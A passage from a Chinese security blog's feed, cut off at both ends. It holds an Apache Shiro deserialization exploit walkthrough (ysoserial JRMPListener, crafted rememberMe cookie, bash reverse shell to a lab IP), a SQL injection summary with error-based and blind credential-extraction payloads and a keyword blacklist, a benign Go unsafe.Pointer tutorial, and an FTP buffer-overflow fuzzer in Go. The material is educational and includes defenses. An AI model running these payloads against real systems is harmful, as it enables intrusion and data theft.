src="https://secure2.wostatic.cn/static/5Q83cE752eXZBvD4YjrmUr/image.png?auth_key=1675524045-99usfLHwY4eLSvKBbhhK8R-0-0915b8f499c4d1f83ebb1d9454a0a270&file_size=418925" alt="img" style="zoom:50%;" /><h5 id="1-kali监听"><a href="#1-kali监听" class="headerlink" title="1.kali监听"></a>1.<strong>kali监听</strong></h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Kali机器（192.168.142.132） </span><br><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><h5 id="2-启动JRMPListener并准备payload1-最后发送的反弹shell载荷"><a href="#2-启动JRMPListener并准备payload1-最后发送的反弹shell载荷" class="headerlink" title="2.启动JRMPListener并准备payload1(最后发送的反弹shell载荷)"></a>2.<strong>启动JRMPListener并准备payload1</strong>(最后发送的反弹shell载荷)</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Kali机器（192.168.142.132）</span><br><span class="line">    </span><br><span class="line">    java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiY x&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line">    反弹连接命令</span><br><span class="line">      bash -i &gt;&amp; /dev/tcp/192.168.142.132/7777 0&gt;&amp;1</span><br><span class="line">      <span class="built_in">base64</span>：bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiY x&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><h5 id="3-python脚本生成cookie-pyload2-最先发出的载荷，让shiro服务器连接我的JRMPListener"><a href="#3-python脚本生成cookie-pyload2-最先发出的载荷，让shiro服务器连接我的JRMPListener" class="headerlink" title="3.python脚本生成cookie(pyload2)(最先发出的载荷，让shiro服务器连接我的JRMPListener)"></a>3.<strong>python脚本生成cookie(pyload2)</strong>(最先发出的载荷，让shiro服务器连接我的JRMPListener)</h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Kali机器（192.168.142.132）</span><br><span class="line">pip3 install pycrypto  <span class="comment">#先安装加密模块</span></span><br><span class="line"></span><br><span class="line">python3 shiro.py 192.168.142.132:8888</span><br><span class="line">  结果：rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8 wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7 z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+h mUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rf CgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364 VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==</span><br></pre></td></tr></table></figure><h5 id="4-抓包发送"><a href="#4-抓包发送" class="headerlink" title="4.抓包发送"></a>4.<strong>抓包发送</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /doLogin HTTP/<span class="number">1.1</span></span><br><span class="line">   Host: <span class="number">192.168</span><span class="number">.142</span><span class="number">.128</span>:<span class="number">8080</span></span><br><span class="line">   User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">98.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">98.0</span></span><br><span class="line">   Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">   Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">   Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">   Content-Length: 47</span></span><br><span class="line"><span class="comment">   Origin: http://192.168.142.128:8080</span></span><br><span class="line"><span class="comment">   Connection: close</span></span><br><span class="line"><span class="comment">   Referer: http://192.168.142.128:8080/doLogin</span></span><br><span class="line"><span class="comment">   Cookie: </span></span><br><span class="line"><span class="comment">   JSESSIONID=BE2042921ED0A1E58436F6FBD5654581;rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0 mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+ vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQq rBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCg Q7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMs fGS2OA9NZ/2jVIFhTdhvU3w==</span></span><br><span class="line"><span class="comment">   Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">   username=a&amp;password=b&amp;rememberme=remember-me</span></span><br></pre></td></tr></table></figure><h5 id="5-结果"><a href="#5-结果" class="headerlink" title="5.结果"></a>5.<strong>结果</strong></h5><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali机器（192.168.142.132） 7777端口被连接</span><br></pre></td></tr></table></figure><h2 id="漏洞修复防御"><a href="#漏洞修复防御" class="headerlink" title="漏洞修复防御"></a>漏洞修复防御</h2><p>1、升级Apache Shiro到最版本 </p><p>2、部署安全产品</p><p>防御工具库： <a href="https://github.com/ikkisoft/SerialKiller/">https://github.com/ikkisoft/SerialKiller/</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入总结</title>
      <link href="/2023/02/04/Web%E5%AE%89%E5%85%A8/Sql%E6%B3%A8%E5%85%A5/Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2023/02/04/Web%E5%AE%89%E5%85%A8/Sql%E6%B3%A8%E5%85%A5/Sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul><li>Web应用程序对用户输入的数据校验处理不严，致使用户可以使用SQL元字符构造恶意语句，与后端数据库SQL语句拼接执行恶意SQL命令。</li></ul><h4 id="检测—判断是否有注入"><a href="#检测—判断是否有注入" class="headerlink" title="检测—判断是否有注入"></a>检测—判断是否有注入</h4><p>有回显检测</p><ol><li>改变可控参数，是否影响页面显示结果</li><li>输入SQL语句能否产生报错  –&gt; ‘</li><li>输入SQL语句能否不报错 –&gt; 可以闭合</li></ol><p>无回显检测</p><ol><li>1’ and sleep(2) —</li></ol><h4 id="sql注入分类："><a href="#sql注入分类：" class="headerlink" title="sql注入分类："></a>sql注入分类：</h4><ul><li><h5 id="依据注入点："><a href="#依据注入点：" class="headerlink" title="依据注入点："></a>依据注入点：</h5><ul><li>数字类型</li><li>字符串类型</li><li>搜索类型</li><li>宽字节注入</li></ul></li><li><h5 id="依据提交方式："><a href="#依据提交方式：" class="headerlink" title="依据提交方式："></a>依据提交方式：</h5><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li><li>HTTP头注入  –&gt; XFF，Referer</li></ul></li><li><h5 id="依据获取方式-x2F-运行结果："><a href="#依据获取方式-x2F-运行结果：" class="headerlink" title="依据获取方式&#x2F;运行结果："></a>依据获取方式&#x2F;运行结果：</h5><ul><li>基于布尔的肓注</li><li>基于时间的盲注</li><li>基于报错的注入</li><li>联合查询注入、</li><li>堆查询注入</li><li>Dnslog注入</li></ul></li></ul><h4 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h4><ul><li><p><strong>预编译 — 使用参数化查询</strong></p><ul><li><p>数据库服务器不会把参数的内容当作<code>SQL</code>指令的一部分来拼接执行；</p></li><li><p>而是在数据库完成<code>SQL</code>指令的编译后才套用参数运行(预编译)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select id, no from user where id=?&quot;;</span><br><span class="line">      PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">      ps.setInt(1, id);</span><br><span class="line">      ps.executeQuery();</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>添加函数检查变量 — 数据类型和格式</strong></p><ul><li>相当于黑名单，毕竟自写函数就像是写黑名单，肯定会有纰漏的。还是少用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uid=checkuid($uid);    <span class="comment">//检测$uid是不是数字类型,不是不继续往下运行.千万别直接里面写一个is_numeric就结束了啊，这很容易就可以用16进制或者是科学计数法去绕过的</span></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;SELECT uid,username FROM user WHERE uid=&#x27;&#123;$uid&#125;‘;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>过滤危险函数和特殊字符</strong></p><ul><li><p>黑名单，还是少用为好，一般有纰漏就可以去绕过的了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">sql_inj</span><span class="params">(String str)</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">String</span> <span class="variable">inj_str</span> <span class="operator">=</span> “’|and|exec|insert|select|delete|update| </span><br><span class="line">count|*|%|chr|mid|master|truncate|<span class="type">char</span>|declare|;|or|-|+|,”; </span><br><span class="line">String inj_stra[] = split(inj_str,”|”); </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span> ; i &lt; inj_stra.length ; i++ ) </span><br><span class="line">&#123; <span class="keyword">if</span> (str.indexOf(inj_stra[i])&gt;=<span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>转译特殊符号</strong></p><ul><li><code>addslashes</code>函数去对特殊字符进行转义，比如单引号会被转译成<code>\’</code>，所以无法闭合和注释。不能达到<code>SQL</code>注入攻击的效果。</li><li>一般在<code>CTF</code>题目里面遇到这个函数的话，我会先去看看其他点是否存在漏洞</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uid</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uid&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;uid&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$uid</span> = <span class="title function_ invoke__">addslashes</span>(uid);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT uid,username FROM user WHERE uid=&#x27;<span class="subst">&#123;$uid&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>中间件配置</strong></p><ul><li>通过启用php.ini配置文件中的magic_quote_gpc (魔术字符)，就可以将大部分想利用SQL注入漏洞的骇客拒绝于门外。</li><li>开启magic_quote_gpc&#x3D;on之后，能实现addslshes()和stripslashes()这两个函数的功能，这就从很大程度上防止了sql注入。</li></ul></li><li><p><strong>通过安全waf去防御</strong></p></li></ul><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li>总的来说，现在很多网站不会再使用字符串拼接去查找数据库里面的内容了</li><li>大多数都是预编译，除了那些荒废的网站以及CTF使用，那以后挖洞挖SQL注入的洞就比较难了害。</li></ul><h4 id="利用函数"><a href="#利用函数" class="headerlink" title="利用函数"></a>利用函数</h4><p><strong>1.文件读取</strong></p><ul><li>load_file(‘’)</li></ul><p><strong>2.限制函数</strong></p><ul><li><p>limit  0 ，1 （限制一组数据，从第0开始读）</p></li><li><p>substring</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;</span>a<span class="string">&#x27;,1,0)--+</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>3.分组函数</strong></p><ul><li>group_concat()<ul><li>group_concat(user, 0x3a, password)</li></ul></li></ul><p><strong>4.信息函数</strong></p><ul><li><p>info()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name,last_name FROM users WHERE user_id =<span class="string">&#x27;1&#x27;</span>and info()-- <span class="comment">//会报错显示当前库不存在这个函数这样当前库名就显示在页面上。</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230204130226121-1675489502544.png" alt="image-20230204130226121"></p></li><li><p>database()</p></li><li><p>user()</p></li></ul><p><strong>5.报错注入函数</strong></p><p>1.floor()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = <span class="number">1</span> and (<span class="keyword">select</span> <span class="number">1</span> from (<span class="keyword">select</span> count(*),concat(version(),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x from information_schema.tables group by x)a)；</span><br></pre></td></tr></table></figure><p>2.extractvalue()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = <span class="number">1</span> and (extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> user()))));</span><br></pre></td></tr></table></figure><p>3.updatexml()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = <span class="number">1</span> and (updatexml(<span class="number">0x3a</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> user())),<span class="number">1</span>)); <span class="comment">//但是只能显示32长度的内容，如果获取的内容超过32字符就要采用字符串截取方法。每次获取32个字符串的长度</span></span><br></pre></td></tr></table></figure><p>4.exp()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id =<span class="number">1</span> and EXP(~(SELECT * from(<span class="keyword">select</span> user())a));</span><br></pre></td></tr></table></figure><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>1.报错</p><ul><li>msqli_error()、mysqli_connect_error()</li></ul><p>2.二次注入</p><ul><li>addslashes 或者是借助 get_magic_quotes_gpc</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文理解unsafe.Pointer和uintptr</title>
      <link href="/2023/02/03/Go/Go%20basic/28.unsafe/"/>
      <url>/2023/02/03/Go/Go%20basic/28.unsafe/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Alignof</span><span class="params">(x ArbitraryType)</span></span> <span class="type">uintptr</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Offsetof</span><span class="params">(x ArbitraryType)</span></span> <span class="type">uintptr</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sizeof</span><span class="params">(x ArbitraryType)</span></span> <span class="type">uintptr</span></span><br><span class="line"><span class="keyword">type</span> ArbitraryType <span class="type">int</span></span><br><span class="line"><span class="keyword">type</span> Pointer *ArbitraryType</span><br></pre></td></tr></table></figure><ul><li>Go 语言的unsafe包很强大，基本上很少会去用它。</li><li>它可以像C一样去操作内存，但由于Go 语言不支持直接进行指针运算，所以用起来稍显麻烦。</li><li>具体的实现方法(长度，偏移量，对齐字节数等)这里不详述。这里关心unsafe.Pointer的用法和含义</li></ul><h4 id="unsafe-Pointer"><a href="#unsafe-Pointer" class="headerlink" title="unsafe.Pointer"></a>unsafe.Pointer</h4><ul><li>unsafe.Pointer其实就是类似C的void *，Windows中的LPVOID</li></ul><h4 id="uintptr"><a href="#uintptr" class="headerlink" title="uintptr"></a>uintptr</h4><ul><li>Go 语言的内置类型，是能存储指针的整型， uintptr 的底层类型是int</li><li>uintptr主要用于Go 语言中的指针运算。</li></ul><h4 id="uintptr和unsafe-Pointer的区别"><a href="#uintptr和unsafe-Pointer的区别" class="headerlink" title="uintptr和unsafe.Pointer的区别"></a>uintptr和unsafe.Pointer的区别</h4><ul><li>unsafe.Pointer只是单纯的通用指针类型，用于转换不同类型指针，不可以参与指针运算；</li><li>而uintptr是用于指针运算的，Go 不把 uintptr 当指针，也就是说 uintptr 无法持有对象， uintptr 类型的目标会被回收；</li><li>unsafe.Pointer 可以和 普通指针 进行相互转换；</li><li>unsafe.Pointer 可以和 uintptr 进行相互转换。</li></ul><h4 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h4><ul><li>需要注意的是unsafe.Sizeof()方法，<ul><li>unsafe.Sizeof(int64(0))是不变的。int64应该是代表本机是64位计算机。</li><li>这里跟C的用法不一样，C是直接传入类型，而Go 语言是传入值。</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> num <span class="keyword">struct</span> &#123;</span><br><span class="line">   i <span class="type">int16</span></span><br><span class="line">   j <span class="type">int64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n num)</span></span> GetI() &#123;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;i=%d\n&quot;</span>, n.i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n num)</span></span> GetJ() &#123;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;j=%d\n&quot;</span>, n.j)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">// 定义指针类型变量</span></span><br><span class="line">   <span class="keyword">var</span> n *num = &amp;num&#123;<span class="number">199</span>, <span class="number">299</span>&#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 需要unsafe.Pointer()中转。转为*int32的值，对应结构体的i。</span></span><br><span class="line">   i := (*<span class="type">int16</span>)(unsafe.Pointer(n))</span><br><span class="line"></span><br><span class="line">   fmt.Println(<span class="string">&quot;指针地址：&quot;</span>, i)</span><br><span class="line">   fmt.Println(<span class="string">&quot;指针uintptr值:&quot;</span>, <span class="type">uintptr</span>(unsafe.Pointer(i)))</span><br><span class="line"></span><br><span class="line">   *i = <span class="type">int16</span>(<span class="number">98</span>)</span><br><span class="line">   <span class="comment">// 根据num结构体的基址加上偏移量进行指针运算，运算后的值为j的地址，使用unsafe.Pointer转为指针</span></span><br><span class="line">   j := (*<span class="type">int64</span>)(unsafe.Pointer(<span class="type">uintptr</span>(unsafe.Pointer(n)) + <span class="type">uintptr</span>(unsafe.Sizeof(<span class="type">int64</span>(<span class="number">0</span>))))) </span><br><span class="line">   <span class="comment">//j := (*int64)(unsafe.Pointer(uintptr(unsafe.Pointer(n)) + uintptr(2)))</span></span><br><span class="line"></span><br><span class="line">   *j = <span class="type">int64</span>(<span class="number">763</span>)</span><br><span class="line"></span><br><span class="line">   n.GetI()</span><br><span class="line">   n.GetJ()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Go basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.1Fuzz</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/9.1Fuzz/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/9.1Fuzz/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul><li>模糊测试是一种将大量数据发送到目标应用程序，迫使目标产生异常行为的技术。进而发现编码错误或安全缺陷，并加以利用</li></ul><h4 id="缓冲区溢出FUZZ"><a href="#缓冲区溢出FUZZ" class="headerlink" title="缓冲区溢出FUZZ"></a>缓冲区溢出FUZZ</h4><ul><li>做过pwn题目的师傅们对栈溢出很熟悉。</li><li>q1和q2处需要注意。<ul><li>连接异常，可能中途服务中断。可能存在缓冲区溢出。但如果</li><li>如果建立连接后无法关闭连接，可能表示远程FTP服务突然异常断开。这可能不是溢出引起，记录异常情况，程序将继续执行</li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;bufio&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2500</span>; i++ &#123; <span class="comment">//FUZZ 2500次</span></span><br><span class="line">      conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;10.0.1.20:21&quot;</span>) <span class="comment">//tcp连接</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatalf(<span class="string">&quot;[!] Error at offset %d: %s\n&quot;</span>, i, err) <span class="comment">//q1</span></span><br><span class="line">      &#125;</span><br><span class="line">      bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>) <span class="comment">//创建bufio缓冲去读响应内容。显示读取为一行</span></span><br><span class="line"></span><br><span class="line">      user := <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="keyword">for</span> n := <span class="number">0</span>; n &lt;= i; n++ &#123; <span class="comment">//要FUZZ测试的USER</span></span><br><span class="line">         user += <span class="string">&quot;A&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      raw := <span class="string">&quot;USER %s\n&quot;</span></span><br><span class="line">      fmt.Fprintf(conn, raw, user)           <span class="comment">//向目标FTP服务器发送USER命令，输入用户名</span></span><br><span class="line">      bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">      raw = <span class="string">&quot;PASS password\n&quot;</span></span><br><span class="line">      fmt.Fprint(conn, raw)                  <span class="comment">//向目标FTP服务器发送PASS命令，输入密码</span></span><br><span class="line">      bufio.NewReader(conn).ReadString(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> err := conn.Close(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Println(<span class="string">&quot;[!] Unable to close connection. Is service alive?&quot;</span>) <span class="comment">//q2</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230201133850967.png" alt="image-20230201133850967"></p><h5 id="改进："><a href="#改进：" class="headerlink" title="改进："></a>改进：</h5><ul><li>可以通过多种方式改进上述代码，以提高其灵活性和便利性。例如，你可能希望删除硬编码的P、端口和迭代值，而不是通过命令行参数或配置文件将其包括在内。你可以试着以此方式改进代码。此外，还可以扩展代码，以便在身份验证后对命令进行模糊测试。具体来说，可以更新该模糊测试器以对CWD&#x2F;CD命令进行模糊测试。各种工具历来都容易受到与处理CWD&#x2F;CD命令相关的缓冲区溢出的影响，这使得此命令成为模糊测试的一个好目标。</li></ul><h4 id="SQL注入模糊测试"><a href="#SQL注入模糊测试" class="headerlink" title="SQL注入模糊测试"></a>SQL注入模糊测试</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;bytes&quot;</span></span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">   <span 